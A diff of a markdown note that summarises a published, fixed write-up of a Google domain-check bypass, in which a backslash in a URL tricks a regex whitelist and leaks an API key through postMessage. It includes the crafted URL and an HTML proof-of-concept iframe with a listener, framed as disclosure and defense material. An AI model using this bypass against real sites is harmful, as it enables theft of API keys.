@@ -28,9 +28,9 @@ A domain whitelist check implemented using a complex regular expression accepted
 
 * Example URL used inside the `pb` parameter:
 
-  ```
+  
   https://console.developers.google.com/henhouse/?pb=["hh-0","gmail",null,[],"https://xdavidhu.me\test.corp.google.com", ...]
-  ```
+  
 * In the regex-based authority extraction, `xdavidhu.me\test.corp.google.com` is considered the authority and ends with `.corp.google.com`, satisfying the `endsWith` check.
 * When parsed by the browser (via `new URL(...)`), the `\` is treated as an authority terminator; `url.hostname` becomes `xdavidhu.me`, and the remainder becomes part of the path. Thus the actual origin becomes `https://xdavidhu.me`. The page served from that origin receives `postMessage` with the API key. ([bugs.xdavidhu.me][1])
 
@@ -40,7 +40,7 @@ A domain whitelist check implemented using a complex regular expression accepted
 
 * The researcher demonstrated the issue by embedding the `henhouse` iframe with a crafted `pb[4]` value containing the backslash trick and listening for `postMessage` events on their domain. The console PoC shows the key arriving in `message` events. Example PoC snippet from the writeup:
 
-  ```html
+  html
   <iframe id="test"
     src='https://console.developers.google.com/henhouse/?pb=["hh-0","gmail",null,[],"https://xdavidhu.me\test.corp.google.com", ...]'>
   </iframe>
@@ -51,7 +51,7 @@ A domain whitelist check implemented using a complex regular expression accepted
       }
     });
   </script>
-  ```
+  
 * Safety note: do not run this PoC against systems you do not own or without permission. The writeup’s PoC demonstrates the parsing mismatch; the researcher responsibly reported the issue. ([bugs.xdavidhu.me][1])
 
 ---
@@ -125,7 +125,6 @@ For implementers of origin/host whitelists or any logic accepting user-supplied 
 * Filename suggestion: `notes/2020-03-08-google-domain-check-bypass.md`
 * Suggested front-matter (if you use metadata):
 
-  ```yaml
   title: "The unexpected Google-wide domain check bypass"
   author: "David Hu (writeup)"
   date: 2020-03-08
@@ -133,7 +132,6 @@ For implementers of origin/host whitelists or any logic accepting user-supplied 
   status: fixed
   references:
     - https://bugs.xdavidhu.me/google/2020/03/08/the-unexpected-google-wide-domain-check-bypass/
-  ```
 
 ---
 
